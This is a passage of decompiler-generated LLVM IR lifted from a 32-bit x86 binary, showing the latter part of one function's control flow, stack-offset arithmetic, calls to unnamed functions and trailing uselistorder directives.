  %v0_804c407 = call i32 @function_804d1e8()
  store i32 %v0_804c407, i32* %eax.global-to-local, align 4
  store i32 %v0_804c407, i32* @esi, align 4
  br label %dec_label_pc_804c46a

dec_label_pc_804c413:                             ; preds = %dec_label_pc_804c3e7
  store i32 %v2_804c413, i32* %eax.global-to-local, align 4
  %v1_804c415 = add i32 %v0_804c164.lcssa, 204
  store i32 %v1_804c415, i32* @edi, align 4
  store i32 1, i32* @esi, align 4
  %v1_804c421 = trunc i32 %v2_804c413 to i8
  %v4_804c421 = inttoptr i32 %v1_804c415 to i8*
  store i8 %v1_804c421, i8* %v4_804c421, align 1
  %v0_804c428 = load i32, i32* @esp, align 4
  %v1_804c428 = add i32 %v0_804c428, 205
  %v2_804c428 = inttoptr i32 %v1_804c428 to i8*
  store i8 0, i8* %v2_804c428, align 1
  br label %dec_label_pc_804c46a

dec_label_pc_804c432:                             ; preds = %dec_label_pc_804c3e2
  %v9_804c432 = icmp eq i32 %v3_804c164, 20
  %v1_804c435 = icmp eq i1 %v9_804c432, false
  br i1 %v1_804c435, label %dec_label_pc_804c5d7, label %dec_label_pc_804c43b

dec_label_pc_804c43b:                             ; preds = %dec_label_pc_804c432
  %v0_804c43b = load i32, i32* %stack_var_-364, align 4
  %v1_804c43b = call i32 @function_804b774(i32 %v0_804c43b)
  store i32 %v1_804c43b, i32* %eax.global-to-local, align 4
  %v0_804c440 = load i32, i32* %edx.global-to-local, align 4
  %v1_804c440 = load i32, i32* @esp, align 4
  %v2_804c440 = add i32 %v1_804c440, -4
  %v3_804c440 = inttoptr i32 %v2_804c440 to i32*
  store i32 %v0_804c440, i32* %v3_804c440, align 4
  %v1_804c441 = add i32 %v1_804c440, -8
  %v2_804c441 = inttoptr i32 %v1_804c441 to i32*
  store i32 128, i32* %v2_804c441, align 4
  %v1_804c446 = add i32 %v1_804c440, 204
  store i32 %v1_804c446, i32* %edx.global-to-local, align 4
  %v2_804c44d = add i32 %v1_804c440, -12
  %v3_804c44d = inttoptr i32 %v2_804c44d to i32*
  store i32 %v1_804c446, i32* %v3_804c44d, align 4
  %v1_804c44e = inttoptr i32 %v1_804c43b to i32*
  %v2_804c44e = load i32, i32* %v1_804c44e, align 4
  %v4_804c44e = add i32 %v1_804c440, -16
  %v5_804c44e = inttoptr i32 %v4_804c44e to i32*
  store i32 %v2_804c44e, i32* %v5_804c44e, align 4
  %v0_804c450 = call i32 @function_804d204()
  store i32 %v0_804c450, i32* %eax.global-to-local, align 4
  %v0_804c455 = load i32, i32* @esp, align 4
  %v1_804c455 = add i32 %v0_804c455, 16
  store i32 %v0_804c450, i32* @edi, align 4
  br label %dec_label_pc_804c3f6

dec_label_pc_804c45c:                             ; preds = %dec_label_pc_804c2eb, %dec_label_pc_804c2e4, %dec_label_pc_804c2d1
  %v0_804c47635 = phi i32 [ %v1_804c277, %dec_label_pc_804c2eb ], [ 0, %dec_label_pc_804c2e4 ], [ 5, %dec_label_pc_804c2d1 ]
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804c476

dec_label_pc_804c460:                             ; preds = %dec_label_pc_804c3f0, %dec_label_pc_804c363
  store i32 ptrtoint ([7 x i8]* @global_var_80536ca.121 to i32), i32* @edi, align 4
  store i32 6, i32* @esi, align 4
  br label %dec_label_pc_804c46a

dec_label_pc_804c46a:                             ; preds = %dec_label_pc_804c413, %dec_label_pc_804c403, %dec_label_pc_804c3d3, %dec_label_pc_804c3a6, %dec_label_pc_804c460
  store i32 0, i32* @ebx, align 4
  store i32 11, i32* @ebp, align 4
  %v0_804c471 = load i32, i32* @esp, align 4
  %v1_804c471 = add i32 %v0_804c471, 7
  %v2_804c471 = inttoptr i32 %v1_804c471 to i8*
  store i8 32, i8* %v2_804c471, align 1
  %v0_804c476.pre = load i32, i32* @esi, align 4
  %v1_804c476.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804c476

dec_label_pc_804c476:                             ; preds = %dec_label_pc_804c45c, %dec_label_pc_804c2f3, %dec_label_pc_804c46a
  %v1_804c476 = phi i32 [ 0, %dec_label_pc_804c45c ], [ %v2_804c2eb, %dec_label_pc_804c2f3 ], [ %v1_804c476.pre, %dec_label_pc_804c46a ]
  %v0_804c476 = phi i32 [ %v0_804c47635, %dec_label_pc_804c45c ], [ %v1_804c277, %dec_label_pc_804c2f3 ], [ %v0_804c476.pre, %dec_label_pc_804c46a ]
  %v2_804c476 = add i32 %v0_804c476, %v1_804c476
  store i32 %v2_804c476, i32* @edx, align 4
  %v0_804c479 = load i32, i32* @ebp, align 4
  %v9_804c479 = icmp eq i32 %v0_804c479, 11
  br i1 %v9_804c479, label %dec_label_pc_804c48a, label %dec_label_pc_804c47e

dec_label_pc_804c47e:                             ; preds = %dec_label_pc_804c476
  %v1_804c480 = add i32 %v0_804c479, -5
  %v6_804c480 = sub i32 4, %v0_804c479
  %v7_804c480 = and i32 %v6_804c480, %v0_804c479
  %v8_804c480 = icmp slt i32 %v7_804c480, 0
  %v9_804c480 = icmp eq i32 %v1_804c480, 0
  %v10_804c480 = icmp slt i32 %v1_804c480, 0
  %v3_804c483 = icmp eq i1 %v10_804c480, %v8_804c480
  %v4_804c483 = icmp eq i1 %v9_804c480, false
  %v5_804c483 = and i1 %v4_804c483, %v3_804c483
  %v6_804c483 = zext i1 %v5_804c483 to i32
  store i32 %v6_804c483, i32* %eax.global-to-local, align 4
  %v2_804c486 = add i32 %v2_804c476, 1
  %v3_804c486 = add i32 %v2_804c486, %v6_804c483
  store i32 %v3_804c486, i32* @edx, align 4
  br label %dec_label_pc_804c48a

dec_label_pc_804c48a:                             ; preds = %dec_label_pc_804c476, %dec_label_pc_804c47e
  %v0_804c48a = load i32, i32* @esp, align 4
  %v1_804c48a = add i32 %v0_804c48a, 24
  %v2_804c48a = inttoptr i32 %v1_804c48a to i32*
  %v3_804c48a = load i32, i32* %v2_804c48a, align 4
  store i32 %v3_804c48a, i32* %eax.global-to-local, align 4
  %v1_804c48e = add i32 %v0_804c48a, 8
  %v2_804c48e = inttoptr i32 %v1_804c48e to i32*
  store i32 0, i32* %v2_804c48e, align 4
  %v0_804c496 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c496 = load i32, i32* @edx, align 4
  %v2_804c496 = sub i32 %v0_804c496, %v1_804c496
  %v7_804c496 = icmp ult i32 %v0_804c496, %v1_804c496
  %v12_804c496 = icmp eq i32 %v2_804c496, 0
  %v2_804c498 = or i1 %v7_804c496, %v12_804c496
  br i1 %v2_804c498, label %dec_label_pc_804c4a0, label %dec_label_pc_804c49a

dec_label_pc_804c49a:                             ; preds = %dec_label_pc_804c48a
  store i32 %v2_804c496, i32* %eax.global-to-local, align 4
  %v1_804c49c = load i32, i32* @esp, align 4
  %v2_804c49c = add i32 %v1_804c49c, 8
  %v3_804c49c = inttoptr i32 %v2_804c49c to i32*
  store i32 %v2_804c496, i32* %v3_804c49c, align 4
  %v0_804c4a4.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_804c4a0

dec_label_pc_804c4a0:                             ; preds = %dec_label_pc_804c48a, %dec_label_pc_804c49a
  %v0_804c4a4 = phi i32 [ %v1_804c496, %dec_label_pc_804c48a ], [ %v0_804c4a4.pre, %dec_label_pc_804c49a ]
  %v0_804c4a0 = load i32, i32* @esp, align 4
  %v1_804c4a0 = add i32 %v0_804c4a0, 8
  %v2_804c4a0 = inttoptr i32 %v1_804c4a0 to i32*
  %v3_804c4a0 = load i32, i32* %v2_804c4a0, align 4
  store i32 %v3_804c4a0, i32* %ecx.global-to-local, align 4
  %v2_804c4a4 = add i32 %v3_804c4a0, %v0_804c4a4
  store i32 %v2_804c4a4, i32* %eax.global-to-local, align 4
  %v1_804c4a7 = inttoptr i32 %v0_804c4a0 to i32*
  %v2_804c4a7 = load i32, i32* %v1_804c4a7, align 4
  %v4_804c4a7 = add i32 %v2_804c4a7, %v2_804c4a4
  store i32 %v4_804c4a7, i32* %v1_804c4a7, align 4
  %v0_804c4aa = load i32, i32* @esp, align 4
  %v1_804c4aa = add i32 %v0_804c4aa, 7
  %v2_804c4aa = inttoptr i32 %v1_804c4aa to i8*
  %v3_804c4aa = load i8, i8* %v2_804c4aa, align 1
  %v9_804c4aa = icmp eq i8 %v3_804c4aa, 48
  %v1_804c4af = icmp eq i1 %v9_804c4aa, false
  br i1 %v1_804c4af, label %dec_label_pc_804c4bb, label %dec_label_pc_804c4b1

dec_label_pc_804c4b1:                             ; preds = %dec_label_pc_804c4a0
  %v0_804c4b1 = load i32, i32* @ebx, align 4
  %v1_804c4b1 = load i32, i32* %ecx.global-to-local, align 4
  %v2_804c4b1 = add i32 %v1_804c4b1, %v0_804c4b1
  store i32 %v2_804c4b1, i32* @ebx, align 4
  %v1_804c4b3 = add i32 %v0_804c4aa, 8
  %v2_804c4b3 = inttoptr i32 %v1_804c4b3 to i32*
  store i32 0, i32* %v2_804c4b3, align 4
  %v0_804c4bb.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c4bb

dec_label_pc_804c4bb:                             ; preds = %dec_label_pc_804c4a0, %dec_label_pc_804c4b1
  %v0_804c4c2 = phi i32 [ %v0_804c4aa, %dec_label_pc_804c4a0 ], [ %v0_804c4bb.pre, %dec_label_pc_804c4b1 ]
  %v1_804c4bb = add i32 %v0_804c4c2, 32
  %v2_804c4bb = inttoptr i32 %v1_804c4bb to i8*
  %v3_804c4bb = load i8, i8* %v2_804c4bb, align 1
  %v4_804c4bb = and i8 %v3_804c4bb, 8
  %v5_804c4bb = icmp eq i8 %v4_804c4bb, 0
  %v1_804c4c0 = icmp eq i1 %v5_804c4bb, false
  br i1 %v1_804c4c0, label %dec_label_pc_804c4e9, label %dec_label_pc_804c4c2

dec_label_pc_804c4c2:                             ; preds = %dec_label_pc_804c4bb
  %v1_804c4c2 = add i32 %v0_804c4c2, 8
  %v2_804c4c2 = inttoptr i32 %v1_804c4c2 to i32*
  %v3_804c4c2 = load i32, i32* %v2_804c4c2, align 4
  store i32 %v3_804c4c2, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804c4cb = add i32 %v0_804c4c2, 368
  %v2_804c4cb = inttoptr i32 %v1_804c4cb to i32*
  %v3_804c4cb = load i32, i32* %v2_804c4cb, align 4
  store i32 %v3_804c4cb, i32* @eax, align 4
  %v0_804c4d2 = call i32 @function_804bfa4()
  store i32 %v0_804c4d2, i32* %eax.global-to-local, align 4
  %v1_804c4d7 = load i32, i32* @esp, align 4
  %v2_804c4d7 = add i32 %v1_804c4d7, 8
  %v3_804c4d7 = inttoptr i32 %v2_804c4d7 to i32*
  %v4_804c4d7 = load i32, i32* %v3_804c4d7, align 4
  %v15_804c4d7 = icmp eq i32 %v0_804c4d2, %v4_804c4d7
  %v1_804c4db = icmp eq i1 %v15_804c4d7, false
  br i1 %v1_804c4db, label %dec_label_pc_804c5d7, label %dec_label_pc_804c4e1

dec_label_pc_804c4e1:                             ; preds = %dec_label_pc_804c4c2
  store i32 0, i32* %v3_804c4d7, align 4
  %v1_804c4e9.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c4e9

dec_label_pc_804c4e9:                             ; preds = %dec_label_pc_804c4bb, %dec_label_pc_804c4e1
  %v1_804c4e9 = phi i32 [ %v0_804c4c2, %dec_label_pc_804c4bb ], [ %v1_804c4e9.pre, %dec_label_pc_804c4e1 ]
  %v0_804c4e9 = load i32, i32* %eax.global-to-local, align 4
  %v2_804c4e9 = add i32 %v1_804c4e9, -4
  %v3_804c4e9 = inttoptr i32 %v2_804c4e9 to i32*
  store i32 %v0_804c4e9, i32* %v3_804c4e9, align 4
  %v0_804c4ea = load i32, i32* %eax.global-to-local, align 4
  %v2_804c4ea = add i32 %v1_804c4e9, -8
  %v3_804c4ea = inttoptr i32 %v2_804c4ea to i32*
  store i32 %v0_804c4ea, i32* %v3_804c4ea, align 4
  %v1_804c4eb = add i32 %v1_804c4e9, 368
  %v2_804c4eb = inttoptr i32 %v1_804c4eb to i32*
  %v3_804c4eb = load i32, i32* %v2_804c4eb, align 4
  %v5_804c4eb = add i32 %v1_804c4e9, -12
  %v6_804c4eb = inttoptr i32 %v5_804c4eb to i32*
  store i32 %v3_804c4eb, i32* %v6_804c4eb, align 4
  %v0_804c4f2 = load i32, i32* @ebp, align 4
  %v1_804c4f2 = add i32 %v0_804c4f2, ptrtoint (i32* @global_var_80536d1.122 to i32)
  store i32 %v1_804c4f2, i32* %eax.global-to-local, align 4
  %v2_804c4f8 = add i32 %v1_804c4e9, -16
  %v3_804c4f8 = inttoptr i32 %v2_804c4f8 to i32*
  store i32 %v1_804c4f2, i32* %v3_804c4f8, align 4
  %v0_804c4f9 = call i32 @function_804d0a8()
  store i32 %v0_804c4f9, i32* %eax.global-to-local, align 4
  %v0_804c4fe = load i32, i32* @esp, align 4
  %v1_804c4fe = add i32 %v0_804c4fe, 384
  %v2_804c4fe = inttoptr i32 %v1_804c4fe to i32*
  %v3_804c4fe = load i32, i32* %v2_804c4fe, align 4
  store i32 %v3_804c4fe, i32* @eax, align 4
  %v0_804c505 = load i32, i32* @ebx, align 4
  store i32 %v0_804c505, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804c50c = call i32 @function_804bfa4()
  store i32 %v0_804c50c, i32* %eax.global-to-local, align 4
  %v0_804c511 = load i32, i32* @esp, align 4
  %v1_804c511 = add i32 %v0_804c511, 16
  %v1_804c514 = load i32, i32* @ebx, align 4
  %v12_804c514 = icmp eq i32 %v0_804c50c, %v1_804c514
  %v1_804c516 = icmp eq i1 %v12_804c514, false
  br i1 %v1_804c516, label %dec_label_pc_804c5d7, label %dec_label_pc_804c51c

dec_label_pc_804c51c:                             ; preds = %dec_label_pc_804c4e9
  %v1_804c51c = add i32 %v0_804c511, 356
  %v2_804c51c = inttoptr i32 %v1_804c51c to i32*
  %v3_804c51c = load i32, i32* %v2_804c51c, align 4
  %v4_804c51c = icmp eq i32 %v3_804c51c, 0
  %v1_804c524 = icmp eq i1 %v4_804c51c, false
  br i1 %v1_804c524, label %dec_label_pc_804c548, label %dec_label_pc_804c526

dec_label_pc_804c526:                             ; preds = %dec_label_pc_804c51c
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_804c528 = load i32, i32* @esi, align 4
  %v1_804c528 = icmp eq i32 %v0_804c528, 0
  br i1 %v1_804c528, label %dec_label_pc_804c53e.thread, label %dec_label_pc_804c53e

dec_label_pc_804c53e.thread:                      ; preds = %dec_label_pc_804c526
  br label %dec_label_pc_804c5a9

dec_label_pc_804c53e:                             ; preds = %dec_label_pc_804c526
  %v2_804c52c = add i32 %v0_804c511, 12
  %v3_804c52c = inttoptr i32 %v2_804c52c to i32*
  store i32 0, i32* %v3_804c52c, align 4
  %v1_804c52d = add i32 %v0_804c511, 384
  %v2_804c52d = inttoptr i32 %v1_804c52d to i32*
  %v3_804c52d = load i32, i32* %v2_804c52d, align 4
  %v5_804c52d = add i32 %v0_804c511, 8
  %v6_804c52d = inttoptr i32 %v5_804c52d to i32*
  store i32 %v3_804c52d, i32* %v6_804c52d, align 4
  %v0_804c534 = load i32, i32* @esi, align 4
  %v2_804c534 = add i32 %v0_804c511, 4
  %v3_804c534 = inttoptr i32 %v2_804c534 to i32*
  store i32 %v0_804c534, i32* %v3_804c534, align 4
  %v0_804c535 = load i32, i32* @edi, align 4
  %v3_804c535 = inttoptr i32 %v0_804c511 to i32*
  store i32 %v0_804c535, i32* %v3_804c535, align 4
  %v0_804c536 = load i32, i32* %stack_var_-364, align 4
  %v4_804c536 = call i32 @function_804fc8c(i32 %v0_804c536, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c536, i32* %eax.global-to-local, align 4
  %v0_804c53b = load i32, i32* @esp, align 4
  %v1_804c53b = add i32 %v0_804c53b, 16
  %v1_804c53e.pre = load i32, i32* @esi, align 4
  %v12_804c53e = icmp eq i32 %v4_804c536, %v1_804c53e.pre
  %v1_804c540 = icmp eq i1 %v12_804c53e, false
  br i1 %v1_804c540, label %dec_label_pc_804c5d7, label %dec_label_pc_804c5a9

dec_label_pc_804c548:                             ; preds = %dec_label_pc_804c51c
  %v1_804c548 = add i32 %v0_804c511, 348
  %v2_804c548 = inttoptr i32 %v1_804c548 to i32*
  store i32 0, i32* %v2_804c548, align 4
  %v0_804c5a56 = load i32, i32* @esi, align 4
  %v1_804c5a57 = icmp eq i32 %v0_804c5a56, 0
  %v1_804c5a714 = icmp eq i1 %v1_804c5a57, false
  br i1 %v1_804c5a714, label %dec_label_pc_804c555, label %dec_label_pc_804c548.dec_label_pc_804c5a9.loopexit_crit_edge

dec_label_pc_804c548.dec_label_pc_804c5a9.loopexit_crit_edge: ; preds = %dec_label_pc_804c548
  %v0_804c5a9.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c5a9

dec_label_pc_804c555:                             ; preds = %dec_label_pc_804c548, %dec_label_pc_804c5a3
  %v0_804c555 = phi i32 [ %v2_804c5a3, %dec_label_pc_804c5a3 ], [ %v0_804c5a56, %dec_label_pc_804c548 ]
  %tmp100 = icmp ult i32 %v0_804c555, 129
  br i1 %tmp100, label %dec_label_pc_804c564, label %dec_label_pc_804c55f

dec_label_pc_804c55f:                             ; preds = %dec_label_pc_804c555
  br label %dec_label_pc_804c564

dec_label_pc_804c564:                             ; preds = %dec_label_pc_804c555, %dec_label_pc_804c55f
  %storemerge101 = phi i32 [ 128, %dec_label_pc_804c55f ], [ %v0_804c555, %dec_label_pc_804c555 ]
  store i32 %storemerge101, i32* %edx.global-to-local, align 4
  %v0_804c564 = load i32, i32* @esp, align 4
  %v1_804c564 = add i32 %v0_804c564, 332
  %v2_804c56b = add i32 %v0_804c564, -4
  %v3_804c56b = inttoptr i32 %v2_804c56b to i32*
  store i32 %v1_804c564, i32* %v3_804c56b, align 4
  %v0_804c56c = load i32, i32* %edx.global-to-local, align 4
  %v2_804c56c = add i32 %v0_804c564, -8
  %v3_804c56c = inttoptr i32 %v2_804c56c to i32*
  store i32 %v0_804c56c, i32* %v3_804c56c, align 4
  %v1_804c56d = add i32 %v0_804c564, 340
  store i32 %v1_804c56d, i32* %eax.global-to-local, align 4
  %v2_804c574 = add i32 %v0_804c564, -12
  %v3_804c574 = inttoptr i32 %v2_804c574 to i32*
  store i32 %v1_804c56d, i32* %v3_804c574, align 4
  %v1_804c575 = add i32 %v0_804c564, 204
  store i32 %v1_804c575, i32* @edi, align 4
  %v2_804c57c = add i32 %v0_804c564, -16
  %v3_804c57c = inttoptr i32 %v2_804c57c to i32*
  store i32 %v1_804c575, i32* %v3_804c57c, align 4
  %v0_804c57d = call i32 @function_804fb30()
  store i32 %v0_804c57d, i32* @ebx, align 4
  %v0_804c584 = load i32, i32* @esp, align 4
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804c589 = icmp eq i32 %v0_804c57d, 0
  br i1 %v1_804c589, label %dec_label_pc_804c59f, label %dec_label_pc_804c58d

dec_label_pc_804c58d:                             ; preds = %dec_label_pc_804c564
  %v0_804c58d = load i32, i32* @ebp, align 4
  %v2_804c58d = add i32 %v0_804c584, 12
  %v3_804c58d = inttoptr i32 %v2_804c58d to i32*
  store i32 %v0_804c58d, i32* %v3_804c58d, align 4
  %v1_804c58e = add i32 %v0_804c584, 384
  %v2_804c58e = inttoptr i32 %v1_804c58e to i32*
  %v3_804c58e = load i32, i32* %v2_804c58e, align 4
  %v5_804c58e = add i32 %v0_804c584, 8
  %v6_804c58e = inttoptr i32 %v5_804c58e to i32*
  store i32 %v3_804c58e, i32* %v6_804c58e, align 4
  %v2_804c595 = add i32 %v0_804c584, 4
  %v3_804c595 = inttoptr i32 %v2_804c595 to i32*
  store i32 %v0_804c57d, i32* %v3_804c595, align 4
  %v0_804c596 = load i32, i32* @edi, align 4
  %v3_804c596 = inttoptr i32 %v0_804c584 to i32*
  store i32 %v0_804c596, i32* %v3_804c596, align 4
  %v0_804c597 = load i32, i32* %stack_var_-364, align 4
  %v4_804c597 = call i32 @function_804fc8c(i32 %v0_804c597, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804c597, i32* %eax.global-to-local, align 4
  %v0_804c59c = load i32, i32* @esp, align 4
  br label %dec_label_pc_804c59f

dec_label_pc_804c59f:                             ; preds = %dec_label_pc_804c564, %dec_label_pc_804c58d
  %v0_804c5d748.in = phi i32 [ %v0_804c584, %dec_label_pc_804c564 ], [ %v0_804c59c, %dec_label_pc_804c58d ]
  %v1_804c5a3 = phi i32 [ 0, %dec_label_pc_804c564 ], [ %v4_804c597, %dec_label_pc_804c58d ]
  %v0_804c5d748 = add i32 %v0_804c5d748.in, 16
  %v12_804c59f = icmp eq i32 %v1_804c5a3, %v0_804c57d
  %v1_804c5a1 = icmp eq i1 %v12_804c59f, false
  br i1 %v1_804c5a1, label %dec_label_pc_804c5d7, label %dec_label_pc_804c5a3

dec_label_pc_804c5a3:                             ; preds = %dec_label_pc_804c59f
  %v0_804c5a3 = load i32, i32* @esi, align 4
  %v2_804c5a3 = sub i32 %v0_804c5a3, %v1_804c5a3
  %v12_804c5a3 = icmp eq i32 %v2_804c5a3, 0
  store i32 %v2_804c5a3, i32* @esi, align 4
  %v1_804c5a7 = icmp eq i1 %v12_804c5a3, false
  br i1 %v1_804c5a7, label %dec_label_pc_804c555, label %dec_label_pc_804c5a9

dec_label_pc_804c5a9:                             ; preds = %dec_label_pc_804c5a3, %dec_label_pc_804c53e.thread, %dec_label_pc_804c548.dec_label_pc_804c5a9.loopexit_crit_edge, %dec_label_pc_804c53e
  %v0_804c5a9 = phi i32 [ %v1_804c53b, %dec_label_pc_804c53e ], [ %v0_804c5a9.pre.pre, %dec_label_pc_804c548.dec_label_pc_804c5a9.loopexit_crit_edge ], [ %v1_804c511, %dec_label_pc_804c53e.thread ], [ %v0_804c5d748, %dec_label_pc_804c5a3 ]
  %v1_804c5a9 = add i32 %v0_804c5a9, 8
  %v2_804c5a9 = inttoptr i32 %v1_804c5a9 to i32*
  %v3_804c5a9 = load i32, i32* %v2_804c5a9, align 4
  store i32 %v3_804c5a9, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804c5b2 = add i32 %v0_804c5a9, 368
  %v2_804c5b2 = inttoptr i32 %v1_804c5b2 to i32*
  %v3_804c5b2 = load i32, i32* %v2_804c5b2, align 4
  store i32 %v3_804c5b2, i32* @eax, align 4
  %v0_804c5b9 = call i32 @function_804bfa4()
  store i32 %v0_804c5b9, i32* %eax.global-to-local, align 4
  %v1_804c5be = load i32, i32* @esp, align 4
  %v2_804c5be = add i32 %v1_804c5be, 8
  %v3_804c5be = inttoptr i32 %v2_804c5be to i32*
  %v4_804c5be = load i32, i32* %v3_804c5be, align 4
  %v15_804c5be = icmp eq i32 %v0_804c5b9, %v4_804c5be
  %v1_804c5c2 = icmp eq i1 %v15_804c5be, false
  br i1 %v1_804c5c2, label %dec_label_pc_804c5d7, label %dec_label_pc_804c5c4

dec_label_pc_804c5c4:                             ; preds = %dec_label_pc_804c5a9, %dec_label_pc_804c33e, %dec_label_pc_804c16c
  %v0_804c5c4 = phi i32 [ %v1_804c5be, %dec_label_pc_804c5a9 ], [ %v0_804c5c4.pre, %dec_label_pc_804c33e ], [ %v1_804c18a, %dec_label_pc_804c16c ]
  %v1_804c5c4 = add i32 %v0_804c5c4, 16
  %v2_804c5c4 = inttoptr i32 %v1_804c5c4 to i32*
  %v3_804c5c4 = load i32, i32* %v2_804c5c4, align 4
  store i32 %v3_804c5c4, i32* @ebx, align 4
  store i32 %v3_804c5c4, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c0c4.backedge

dec_label_pc_804c5cf:                             ; preds = %dec_label_pc_804c102
  %v1_804c5cf = add i32 %v0_804c5cf, 2
  store i32 %v1_804c5cf, i32* @ebx, align 4
  br label %dec_label_pc_804c0c4.backedge

dec_label_pc_804c5d7:                             ; preds = %dec_label_pc_804c0ee, %dec_label_pc_804c5a9, %dec_label_pc_804c53e, %dec_label_pc_804c4e9, %dec_label_pc_804c4c2, %dec_label_pc_804c432, %dec_label_pc_804c315, %dec_label_pc_804c3ad, %dec_label_pc_804c381, %dec_label_pc_804c59f
  %v0_804c5d7 = phi i32 [ %v0_804c5d748, %dec_label_pc_804c59f ], [ %v0_804c5d7.pre.pre, %dec_label_pc_804c0ee ], [ %v1_804c5be, %dec_label_pc_804c5a9 ], [ %v1_804c53b, %dec_label_pc_804c53e ], [ %v1_804c511, %dec_label_pc_804c4e9 ], [ %v1_804c4d7, %dec_label_pc_804c4c2 ], [ %v0_804c164.lcssa, %dec_label_pc_804c432 ], [ %v1_804c333, %dec_label_pc_804c315 ], [ %v1_804c3c5, %dec_label_pc_804c3ad ], [ %v1_804c398, %dec_label_pc_804c381 ]
  %v1_804c5d7 = inttoptr i32 %v0_804c5d7 to i32*
  store i32 -1, i32* %v1_804c5d7, align 4
  br label %dec_label_pc_804c5de

dec_label_pc_804c5de:                             ; preds = %dec_label_pc_804c0f9, %dec_label_pc_804c067, %dec_label_pc_804c086, %dec_label_pc_804c5d7
  %v0_804c5de = load i32, i32* @esp, align 4
  %v1_804c5de = inttoptr i32 %v0_804c5de to i32*
  %v2_804c5de = load i32, i32* %v1_804c5de, align 4
  store i32 %v2_804c5de, i32* %eax.global-to-local, align 4
  %v1_804c5e1 = add i32 %v0_804c5de, 348
  %v1_804c5e7 = inttoptr i32 %v1_804c5e1 to i32*
  %v2_804c5e7 = load i32, i32* %v1_804c5e7, align 4
  store i32 %v2_804c5e7, i32* @ebx, align 4
  ret i32 %v2_804c5de

; uselistorder directives
  uselistorder i32 %v1_804c5cf, { 1, 0 }
  uselistorder i32 %v3_804c5c4, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804c5a9, { 1, 0 }
  uselistorder i32 %v2_804c5a3, { 1, 2, 0 }
  uselistorder i32 %v0_804c5d748, { 1, 0 }
  uselistorder i32 %v1_804c5a3, { 1, 0 }
  uselistorder i32 %v0_804c584, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 %v0_804c57d, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c511, { 0, 6, 1, 2, 3, 4, 5, 7 }
  uselistorder i32 %v1_804c4e9, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804c4c2, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804c496, { 1, 0, 2 }
  uselistorder i32 %v6_804c483, { 1, 0 }
  uselistorder i32 %v1_804c480, { 1, 0 }
  uselistorder i32 %v0_804c479, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804c403, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v2_804c413, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804c374, { 5, 4, 3, 2, 1, 0, 6 }
  uselistorder i32 %v0_804c35a, { 5, 4, 3, 2, 1, 0, 6, 7 }
  uselistorder i32 %v0_804c2f3, { 1, 0, 2 }
  uselistorder i32 %v1_804c277, { 1, 2, 4, 3, 0, 5 }
  uselistorder i32 %v0_804c2ca, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v3_804c253, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804c20c, { 1, 0 }
  uselistorder i32 %v1_804c219, { 3, 2, 1, 0, 4, 5 }
  uselistorder i32 %v3_804c164, { 3, 10, 11, 5, 4, 7, 6, 8, 12, 0, 1, 2, 13, 9, 14, 15 }
  uselistorder i32 %v0_804c164.lcssa, { 0, 8, 7, 6, 9, 24, 23, 12, 13, 14, 15, 16, 17, 11, 10, 19, 18, 22, 21, 20, 2, 3, 4, 5, 1 }
  uselistorder i32 %v2_804c160, { 1, 0 }
  uselistorder i32 %v1_804c160.pre, { 1, 0 }
  uselistorder i32 %v1_804c15f, { 3, 2, 1, 4, 0 }
  uselistorder i32 %v1_804c15c, { 1, 0 }
  uselistorder i32 %v2_804c16078, { 1, 0 }
  uselistorder i32 %v3_804c146, { 1, 0 }
  uselistorder i32 %v1_804c102, { 0, 2, 3, 1 }
  uselistorder i32 %v2_804c0ce, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804c0d2, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804c0bc, { 1, 0, 2 }
  uselistorder i32* %stack_var_-348, { 1, 0, 2 }
  uselistorder i32* %stack_var_-364, { 6, 5, 0, 3, 2, 1, 4, 7, 8, 9 }
  uselistorder i32* %edx.global-to-local, { 2, 3, 0, 4, 28, 13, 1, 14, 18, 15, 16, 17, 19, 5, 6, 7, 9, 8, 21, 20, 22, 23, 29, 24, 25, 26, 30, 27, 31, 10, 11, 12 }
  uselistorder i32* %ecx.global-to-local, { 1, 2, 5, 0, 3, 4, 6, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 12, 10, 13, 14, 15, 16, 17, 18, 19, 20, 21, 32, 33, 34, 35, 36, 37, 38, 39, 22, 23, 24, 40, 41, 42, 43, 44, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 25, 26, 27, 46, 28, 29, 30, 31 }
  uselistorder i32 348, { 1, 0 }
  uselistorder i32 ()* @function_804bfa4, { 2, 1, 0, 3 }
  uselistorder i32 ()* @function_804fb30, { 1, 0 }
  uselistorder i32 332, { 1, 0, 2, 3 }
  uselistorder i32 204, { 2, 0, 3, 1, 4 }
  uselistorder i32 344, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 368, { 3, 1, 4, 0, 2 }
  uselistorder label %dec_label_pc_804c5de, { 3, 0, 2, 1 }
